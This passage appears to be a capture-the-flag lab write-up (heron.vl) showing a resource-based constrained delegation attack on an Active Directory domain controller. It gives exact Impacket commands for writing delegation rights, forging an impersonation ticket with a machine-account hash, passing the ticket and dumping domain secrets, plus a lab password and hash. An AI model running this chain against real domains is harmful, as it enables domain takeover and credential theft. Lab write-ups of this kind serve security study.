
--> First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py 

But we already got hash of FRAJMP$


--> We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:

```
└─# impacket-rbcd heron.vl/adm_prju:ayDMWV929N9wAiB4 -action 'write' -delegate-from 'FRAJMP$' -delegate-to 'MUCDC$'
```

--> And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's getST.py example script can be used for that purpose.

```
└─# impacket-getST -spn 'cifs/MUCDC.heron.vl' -impersonate '_admin' heron.vl/FRAJMP$ -hashes :6f55b3b443ef192c804b2ae98e8254f7
```

This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER.

```
└─# export KRB5CCNAME=_admin@cifs_MUCDC.heron.vl@HERON.VL.ccache
```

```
└─# impacket-secretsdump -k mucdc.heron.vl
```


WE OWN THE DC !

